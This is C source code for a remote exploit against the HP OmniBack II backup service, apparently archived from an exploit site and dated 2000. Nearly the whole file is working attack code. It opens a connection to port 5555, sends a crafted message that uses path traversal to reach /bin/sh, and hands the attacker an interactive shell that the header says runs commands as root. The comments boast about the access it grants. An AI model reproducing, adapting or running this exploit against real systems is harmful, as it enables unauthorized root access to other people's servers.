/*
 * HP OpenView OmniBack II generic remote Exploit by DiGiT - teddi@linux.is
 *
 * Omniback is a network backup system by HP, widely used.
 * took me some time to figure out how omniback communicated then it was just
 * a matter of finding a bug.
 *
 * This lovely little exploit will give you a remote "shell" of sorts, you
 * can execute any command on the system.
 *
 * As far as I can tell this thing is vuln on every Omniback I have seen.
 * I've tried HP-UX, Linux so far, with diff versions etc. It needs some change
 * to work on windows, but should very extremly easy, be creative.
 *
 * Greets, #!security.is, #!ADM#$%$#, #hax & HP systems for this proggie ;>
 *
 * - DiGiT [digit@security.is]
 *
 * I'm releasing this because it leaked and kids got their hands on it ;<
 * sorry.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <errno.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/stat.h>


int sockfd;
struct hostent *host;

usage (char *progname)
  {

  printf ("\nOmniback II *: remote exploit by DiGiT - teddi@linux.is\n");
  printf ("Gives possibility to execute any command on a remote system as root!\n\n");
  printf ("Usage: %s hostname \n\n", progname);
  exit (1);

}

int
shell()
  {

   fd_set fd_stat;
   char recv[1024];
   int n,i;
   static char testcmd[256] = "/bin/uname -a ; id ;\r\n";

        fprintf(stdout, "We have remote shell&%#$&%!\n");
        fprintf(stdout, "\nType in any command and it will get executed.\nHave fun... DiGiT - teddi@linux.is\n\n\n");
        write(sockfd, testcmd, strlen(testcmd));
     
   while(1)
   {
      FD_ZERO(&fd_stat);
      FD_SET(sockfd, &fd_stat);
      FD_SET(0, &fd_stat);
      select(sockfd+1, &fd_stat, NULL, NULL, NULL);
      if (FD_ISSET(sockfd, &fd_stat))
       {
         if((n=read (sockfd,recv,sizeof(recv))) < 0)
           {
              printf("Connection has been closed\n");
              exit(0);
           }
           for(i = 0; i < n ; i++) {
         if(recv[i] == '\000') {
      recv[i] = "";
    }
           }
             recv[n] = 0;
       recv[n-1] = '\n';
             fprintf(stdout, "%s\n", recv);
        }
      if (FD_ISSET(0, &fd_stat))
       {
         if((n=read(0, recv, sizeof(recv)))>0)
           {
            if(write(sockfd, recv,n) == -1)
                {
                 printf("Error %$#\n");
                 exit(0);
               }
           }
       }
   }
}


send_code ()
  {

  char path[32];

 /* I dont care I just made test code and it worked, so #$%$# off */
 write (sockfd, "\000\000\000.", 4);
 write(sockfd, "2", 1);
 write(sockfd, "\000", 1);
 write(sockfd, " a", 2);
 write(sockfd, "\000", 1);
 write(sockfd, " 0", 2);
 write(sockfd, "\000", 1);
 write(sockfd, " 0", 2);
 write(sockfd, "\000", 1);
 write(sockfd, " 0", 2);
 write(sockfd, "\000", 1);
 write(sockfd, " A", 2);
 write(sockfd, "\000", 1);
 write(sockfd, " 28", 3);
 write(sockfd, "\000", 1);
 snprintf(path, sizeof(path), "/../../../bin/sh");
 write(sockfd, path, strlen(path));
 write(sockfd, "\000", 1);
 write(sockfd, "\000", 1);
 write(sockfd, "digit ", 6);
 write(sockfd, "AAAA\n", 6); // nada..

 shell(); // and the lord said, let there be shell.
 exit(0);
 
}

create_socket (char *hostname)
  {

  struct sockaddr_in s;
  int ipaddr;

  if ((host = gethostbyname (hostname)) == NULL)
  {
    herror ("gethostbyname");
    exit (1);
  }

  memcpy (&ipaddr, host->h_addr, host->h_length);

  memset (&s, 0, sizeof (struct sockaddr_in));
  s.sin_family = AF_INET;
  s.sin_port = htons (5555);
  s.sin_addr.s_addr = ipaddr;

  if ((sockfd = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      perror ("socket");
      exit (1);
    }

  if ((connect (sockfd, (struct sockaddr *) &s, sizeof (s))) < 0)
    {
      perror ("connect");
      exit (1);
    }

}

int
main (char argc, char *argv[])
 {

  char hostname[256];

  if (argc < 2)
    {
      usage (argv[0]);
      return 0;
    }

    strncpy(hostname, argv[1], sizeof(hostname));
    create_socket (hostname);
    send_code();

 return 0;

} 

// milw0rm.com [2000-12-21]